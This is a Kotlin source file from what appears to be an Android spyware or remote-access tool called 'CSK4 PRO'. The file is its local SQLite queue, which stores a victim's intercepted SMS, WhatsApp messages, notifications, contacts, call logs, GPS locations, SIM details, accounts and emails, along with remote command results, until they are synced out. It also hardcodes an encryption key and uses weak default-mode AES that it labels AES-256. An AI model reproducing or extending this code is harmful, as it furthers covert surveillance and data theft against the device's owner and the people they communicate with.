package com.csk4.app

import android.content.ContentValues
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import android.util.Base64
import android.util.Log
import org.json.JSONObject
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

/**
 * ============================================
 * CSK4 PRO v4.0 - Local Storage (SQLite)
 * ============================================
 * Features:
 * - Offline data queue
 * - AES-256 Encryption (optional)
 * - Auto-sync tracking
 * - Data cleanup
 * - Pending count
 * ============================================
 */
class LocalStorage(context: Context) : SQLiteOpenHelper(context, DB_NAME, null, DB_VERSION) {

    companion object {
        private const val TAG = "CSK4_DB"
        private const val DB_NAME = Config.DB_NAME
        private const val DB_VERSION = Config.DB_VERSION

        // Encryption key (AES-256)
        private const val ENCRYPTION_KEY = "CSK4-PRO-SECRET-KEY-2026-XYZ123"

        // Tables
        private const val TABLE_COMMANDS = "commands_queue"
        private const val TABLE_HEARTBEATS = "heartbeats_queue"
        private const val TABLE_LOCATIONS = "locations_queue"
        private const val TABLE_SMS = "sms_queue"
        private const val TABLE_NOTIFICATIONS = "notifications_queue"
        private const val TABLE_WHATSAPP = "whatsapp_queue"
        private const val TABLE_ACTIVITIES = "activities_queue"
        private const val TABLE_CONTACTS = "contacts_queue"
        private const val TABLE_CALLS = "calls_queue"
        private const val TABLE_SIM = "sim_queue"
        private const val TABLE_ACCOUNTS = "accounts_queue"
        private const val TABLE_EMAILS = "emails_queue"
    }

    // ============ ENCRYPTION ============
    private fun encrypt(data: String): String {
        if (!Config.ENABLE_ENCRYPTION) return data
        return try {
            val key = SecretKeySpec(ENCRYPTION_KEY.toByteArray(), "AES")
            val cipher = Cipher.getInstance("AES")
            cipher.init(Cipher.ENCRYPT_MODE, key)
            val encrypted = cipher.doFinal(data.toByteArray())
            Base64.encodeToString(encrypted, Base64.DEFAULT)
        } catch (e: Exception) {
            Log.e(TAG, "Encrypt error: ${e.message}")
            data
        }
    }

    private fun decrypt(data: String): String {
        if (!Config.ENABLE_ENCRYPTION) return data
        return try {
            val key = SecretKeySpec(ENCRYPTION_KEY.toByteArray(), "AES")
            val cipher = Cipher.getInstance("AES")
            cipher.init(Cipher.DECRYPT_MODE, key)
            val decoded = Base64.decode(data, Base64.DEFAULT)
            String(cipher.doFinal(decoded))
        } catch (e: Exception) {
            Log.e(TAG, "Decrypt error: ${e.message}")
            data
        }
    }

    // ============ CREATE TABLES ============
    override fun onCreate(db: SQLiteDatabase) {
        try {
            // Commands
            db.execSQL("""
                CREATE TABLE $TABLE_COMMANDS (
                    id TEXT PRIMARY KEY,
                    result TEXT,
                    synced INTEGER DEFAULT 0,
                    timestamp INTEGER
                )
            """)

            // Heartbeats
            db.execSQL("""
                CREATE TABLE $TABLE_HEARTBEATS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    battery INTEGER,
                    synced INTEGER DEFAULT 0,
                    timestamp INTEGER
                )
            """)

            // Locations
            db.execSQL("""
                CREATE TABLE $TABLE_LOCATIONS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    lat REAL,
                    lng REAL,
                    synced INTEGER DEFAULT 0,
                    timestamp INTEGER
                )
            """)

            // SMS
            db.execSQL("""
                CREATE TABLE $TABLE_SMS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    from_number TEXT,
                    body TEXT,
                    time TEXT,
                    type TEXT,
                    synced INTEGER DEFAULT 0
                )
            """)

            // Notifications
            db.execSQL("""
                CREATE TABLE $TABLE_NOTIFICATIONS (
                    id TEXT PRIMARY KEY,
                    package_name TEXT,
                    title TEXT,
                    text TEXT,
                    time INTEGER,
                    synced INTEGER DEFAULT 0
                )
            """)

            // WhatsApp
            db.execSQL("""
                CREATE TABLE $TABLE_WHATSAPP (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    from_name TEXT,
                    message TEXT,
                    time INTEGER,
                    synced INTEGER DEFAULT 0
                )
            """)

            // Activities
            db.execSQL("""
                CREATE TABLE $TABLE_ACTIVITIES (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    type TEXT,
                    data TEXT,
                    time INTEGER,
                    synced INTEGER DEFAULT 0
                )
            """)

            // Contacts
            db.execSQL("""
                CREATE TABLE $TABLE_CONTACTS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT,
                    phone TEXT,
                    type TEXT,
                    synced INTEGER DEFAULT 0
                )
            """)

            // Calls
            db.execSQL("""
                CREATE TABLE $TABLE_CALLS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    number TEXT,
                    name TEXT,
                    type INTEGER,
                    duration INTEGER,
                    time INTEGER,
                    synced INTEGER DEFAULT 0
                )
            """)

            // SIM
            db.execSQL("""
                CREATE TABLE $TABLE_SIM (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id TEXT,
                    sims TEXT,
                    synced INTEGER DEFAULT 0,
                    timestamp INTEGER
                )
            """)

            // Accounts
            db.execSQL("""
                CREATE TABLE $TABLE_ACCOUNTS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id TEXT,
                    accounts TEXT,
                    synced INTEGER DEFAULT 0,
                    timestamp INTEGER
                )
            """)

            // Emails
            db.execSQL("""
                CREATE TABLE $TABLE_EMAILS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id TEXT,
                    emails TEXT,
                    synced INTEGER DEFAULT 0,
                    timestamp INTEGER
                )
            """)

            Log.d(TAG, "✅ All tables created")
        } catch (e: Exception) {
            Log.e(TAG, "onCreate error: ${e.message}")
        }
    }

    override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
        try {
            val tables = listOf(
                TABLE_COMMANDS, TABLE_HEARTBEATS, TABLE_LOCATIONS, TABLE_SMS,
                TABLE_NOTIFICATIONS, TABLE_WHATSAPP, TABLE_ACTIVITIES,
                TABLE_CONTACTS, TABLE_CALLS, TABLE_SIM, TABLE_ACCOUNTS, TABLE_EMAILS
            )
            tables.forEach { db.execSQL("DROP TABLE IF EXISTS $it") }
            onCreate(db)
        } catch (e: Exception) {
            Log.e(TAG, "onUpgrade error: ${e.message}")
        }
    }

    // ============ COMMANDS ============
    fun addCommandResult(id: String, result: String) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("id", id)
                put("result", encrypt(result))
                put("synced", 0)
                put("timestamp", System.currentTimeMillis())
            }
            db.insertWithOnConflict(TABLE_COMMANDS, null, cv, SQLiteDatabase.CONFLICT_REPLACE)
            Log.d(TAG, "📥 Command saved offline: $id")
        } catch (e: Exception) {
            Log.e(TAG, "addCommandResult error: ${e.message}")
        }
    }

    fun getPendingCommandResults(): List<Pair<String, String>> {
        val list = mutableListOf<Pair<String, String>>()
        try {
            val db = readableDatabase
            val cur = db.rawQuery(
                "SELECT id, result FROM $TABLE_COMMANDS WHERE synced=0 LIMIT 100", null
            )
            cur.use {
                while (it.moveToNext()) {
                    list.add(Pair(it.getString(0), decrypt(it.getString(1) ?: "")))
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getPendingCommandResults error: ${e.message}")
        }
        return list
    }

    fun markCommandSynced(id: String) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply { put("synced", 1) }
            db.update(TABLE_COMMANDS, cv, "id=?", arrayOf(id))
            // Delete synced > 1 day
            db.delete(TABLE_COMMANDS, "synced=1 AND timestamp < ?",
                arrayOf((System.currentTimeMillis() - 86400000).toString()))
        } catch (e: Exception) {
            Log.e(TAG, "markCommandSynced error: ${e.message}")
        }
    }

    // ============ HEARTBEATS ============
    fun addHeartbeat(battery: Int) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("battery", battery)
                put("synced", 0)
                put("timestamp", System.currentTimeMillis())
            }
            db.insert(TABLE_HEARTBEATS, null, cv)
        } catch (e: Exception) {
            Log.e(TAG, "addHeartbeat error: ${e.message}")
        }
    }

    fun getPendingHeartbeats(): List<Int> {
        val list = mutableListOf<Int>()
        try {
            val db = readableDatabase
            val cur = db.rawQuery(
                "SELECT id, battery FROM $TABLE_HEARTBEATS WHERE synced=0 LIMIT 50", null
            )
            cur.use {
                while (it.moveToNext()) {
                    list.add(it.getInt(1))
                }
            }
        } catch (e: Exception) {}
        return list
    }

    fun markHeartbeatSynced(battery: Int) {
        try {
            val db = writableDatabase
            db.delete(TABLE_HEARTBEATS, "battery=? AND synced=0", arrayOf(battery.toString()))
        } catch (e: Exception) {}
    }

    // ============ LOCATIONS ============
    fun addLocation(lat: Double, lng: Double) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("lat", lat)
                put("lng", lng)
                put("synced", 0)
                put("timestamp", System.currentTimeMillis())
            }
            db.insert(TABLE_LOCATIONS, null, cv)
        } catch (e: Exception) {}
    }

    fun getPendingLocations(): List<Pair<Double, Double>> {
        val list = mutableListOf<Pair<Double, Double>>()
        try {
            val db = readableDatabase
            val cur = db.rawQuery(
                "SELECT lat, lng FROM $TABLE_LOCATIONS WHERE synced=0 LIMIT 100", null
            )
            cur.use {
                while (it.moveToNext()) {
                    list.add(Pair(it.getDouble(0), it.getDouble(1)))
                }
            }
        } catch (e: Exception) {}
        return list
    }

    fun markLocationSynced(lat: Double, lng: Double) {
        try {
            val db = writableDatabase
            db.delete(TABLE_LOCATIONS, "lat=? AND lng=? AND synced=0",
                arrayOf(lat.toString(), lng.toString()))
        } catch (e: Exception) {}
    }

    // ============ SMS ============
    fun addSMS(from: String, body: String, time: String, type: String) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("from_number", from)
                put("body", encrypt(body))
                put("time", time)
                put("type", type)
                put("synced", 0)
            }
            db.insert(TABLE_SMS, null, cv)
        } catch (e: Exception) {}
    }

    fun getPendingSMS(): List<JSONObject> {
        val list = mutableListOf<JSONObject>()
        try {
            val db = readableDatabase
            val cur = db.rawQuery(
                "SELECT from_number, body, time, type FROM $TABLE_SMS WHERE synced=0 LIMIT 200",
                null
            )
            cur.use {
                while (it.moveToNext()) {
                    list.add(JSONObject().apply {
                        put("from", it.getString(0))
                        put("body", decrypt(it.getString(1) ?: ""))
                        put("time", it.getString(2))
                        put("type", it.getString(3))
                    })
                }
            }
        } catch (e: Exception) {}
        return list
    }

    fun clearSyncedSMS() {
        try {
            writableDatabase.delete(TABLE_SMS, "synced=0", null)
        } catch (e: Exception) {}
    }

    // ============ NOTIFICATIONS ============
    fun addNotification(pkg: String, title: String, text: String) {
        try {
            val id = System.currentTimeMillis().toString() + "_" + pkg.hashCode()
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("id", id)
                put("package_name", pkg)
                put("title", encrypt(title))
                put("text", encrypt(text))
                put("time", System.currentTimeMillis())
                put("synced", 0)
            }
            db.insertWithOnConflict(TABLE_NOTIFICATIONS, null, cv, SQLiteDatabase.CONFLICT_REPLACE)
        } catch (e: Exception) {}
    }

    fun getPendingNotifications(): List<JSONObject> {
        val list = mutableListOf<JSONObject>()
        try {
            val db = readableDatabase
            val cur = db.rawQuery(
                "SELECT id, package_name, title, text FROM $TABLE_NOTIFICATIONS WHERE synced=0 LIMIT 100",
                null
            )
            cur.use {
                while (it.moveToNext()) {
                    list.add(JSONObject().apply {
                        put("id", it.getString(0))
                        put("package", it.getString(1))
                        put("title", decrypt(it.getString(2) ?: ""))
                        put("text", decrypt(it.getString(3) ?: ""))
                    })
                }
            }
        } catch (e: Exception) {}
        return list
    }

    fun markNotificationSynced(id: String) {
        try {
            writableDatabase.delete(TABLE_NOTIFICATIONS, "id=?", arrayOf(id))
        } catch (e: Exception) {}
    }

    // ============ WHATSAPP ============
    fun addWhatsApp(from: String, message: String) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("from_name", from)
                put("message", encrypt(message))
                put("time", System.currentTimeMillis())
                put("synced", 0)
            }
            db.insert(TABLE_WHATSAPP, null, cv)
        } catch (e: Exception) {}
    }

    fun getPendingWhatsApp(): List<JSONObject> {
        val list = mutableListOf<JSONObject>()
        try {
            val db = readableDatabase
            val cur = db.rawQuery(
                "SELECT from_name, message, time FROM $TABLE_WHATSAPP WHERE synced=0 LIMIT 100",
                null
            )
            cur.use {
                while (it.moveToNext()) {
                    list.add(JSONObject().apply {
                        put("from", it.getString(0))
                        put("message", decrypt(it.getString(1) ?: ""))
                        put("time", it.getLong(2))
                    })
                }
            }
        } catch (e: Exception) {}
        return list
    }

    // ============ ACTIVITIES ============
    fun addActivity(type: String, data: String) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("type", type)
                put("data", encrypt(data))
                put("time", System.currentTimeMillis())
                put("synced", 0)
            }
            db.insert(TABLE_ACTIVITIES, null, cv)
        } catch (e: Exception) {}
    }

    // ============ CONTACTS ============
    fun addContact(name: String, phone: String, type: String) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("name", encrypt(name))
                put("phone", phone)
                put("type", type)
                put("synced", 0)
            }
            db.insert(TABLE_CONTACTS, null, cv)
        } catch (e: Exception) {}
    }

    fun getPendingContacts(): List<JSONObject> {
        val list = mutableListOf<JSONObject>()
        try {
            val db = readableDatabase
            val cur = db.rawQuery(
                "SELECT name, phone, type FROM $TABLE_CONTACTS WHERE synced=0 LIMIT 200", null
            )
            cur.use {
                while (it.moveToNext()) {
                    list.add(JSONObject().apply {
                        put("name", decrypt(it.getString(0) ?: ""))
                        put("phone", it.getString(1))
                        put("type", it.getString(2))
                    })
                }
            }
        } catch (e: Exception) {}
        return list
    }

    // ============ CALLS ============
    fun addCall(number: String, name: String, type: Int, duration: Long, time: Long) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("number", number)
                put("name", encrypt(name))
                put("type", type)
                put("duration", duration)
                put("time", time)
                put("synced", 0)
            }
            db.insert(TABLE_CALLS, null, cv)
        } catch (e: Exception) {}
    }

    // ============ SIM ============
    fun addSim(deviceId: String, sims: String) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("device_id", deviceId)
                put("sims", encrypt(sims))
                put("synced", 0)
                put("timestamp", System.currentTimeMillis())
            }
            db.insert(TABLE_SIM, null, cv)
        } catch (e: Exception) {}
    }

    // ============ ACCOUNTS ============
    fun addAccounts(deviceId: String, accounts: String) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("device_id", deviceId)
                put("accounts", encrypt(accounts))
                put("synced", 0)
                put("timestamp", System.currentTimeMillis())
            }
            db.insert(TABLE_ACCOUNTS, null, cv)
        } catch (e: Exception) {}
    }

    // ============ EMAILS ============
    fun addEmails(deviceId: String, emails: String) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("device_id", deviceId)
                put("emails", encrypt(emails))
                put("synced", 0)
                put("timestamp", System.currentTimeMillis())
            }
            db.insert(TABLE_EMAILS, null, cv)
        } catch (e: Exception) {}
    }

    // ============ CLEANUP ============
    fun cleanup() {
        try {
            val db = writableDatabase
            val weekAgo = System.currentTimeMillis() - (7 * 86400000L)
            
            db.delete(TABLE_COMMANDS, "synced=1 AND timestamp < ?", arrayOf(weekAgo.toString()))
            db.delete(TABLE_HEARTBEATS, "synced=1", null)
            db.delete(TABLE_LOCATIONS, "synced=1", null)
            db.delete(TABLE_SMS, "synced=1", null)
            db.delete(TABLE_NOTIFICATIONS, "synced=1", null)
            db.delete(TABLE_WHATSAPP, "synced=1", null)
            db.delete(TABLE_ACTIVITIES, "synced=1", null)
            db.delete(TABLE_CONTACTS, "synced=1", null)
            db.delete(TABLE_CALLS, "synced=1", null)
            db.delete(TABLE_SIM, "synced=1", null)
            db.delete(TABLE_ACCOUNTS, "synced=1", null)
            db.delete(TABLE_EMAILS, "synced=1", null)
            
            Log.d(TAG, "🧹 Cleanup done")
        } catch (e: Exception) {
            Log.e(TAG, "Cleanup error: ${e.message}")
        }
    }

    // ============ PENDING COUNT ============
    fun getPendingCount(): Int {
        var count = 0
        try {
            val db = readableDatabase
            val tables = listOf(
                TABLE_COMMANDS, TABLE_HEARTBEATS, TABLE_LOCATIONS, TABLE_SMS,
                TABLE_NOTIFICATIONS, TABLE_WHATSAPP, TABLE_ACTIVITIES,
                TABLE_CONTACTS, TABLE_CALLS, TABLE_SIM, TABLE_ACCOUNTS, TABLE_EMAILS
            )
            tables.forEach { table ->
                try {
                    val cur = db.rawQuery("SELECT COUNT(*) FROM $table WHERE synced=0", null)
                    cur.use { if (it.moveToFirst()) count += it.getInt(0) }
                } catch (e: Exception) {}
            }
        } catch (e: Exception) {}
        return count
    }

    // ============ DELETE ALL ============
    fun deleteAll() {
        try {
            val db = writableDatabase
            val tables = listOf(
                TABLE_COMMANDS, TABLE_HEARTBEATS, TABLE_LOCATIONS, TABLE_SMS,
                TABLE_NOTIFICATIONS, TABLE_WHATSAPP, TABLE_ACTIVITIES,
                TABLE_CONTACTS, TABLE_CALLS, TABLE_SIM, TABLE_ACCOUNTS, TABLE_EMAILS
            )
            tables.forEach { db.delete(it, null, null) }
            Log.d(TAG, "🗑️ All data deleted")
        } catch (e: Exception) {
            Log.e(TAG, "deleteAll error: ${e.message}")
        }
    }
}
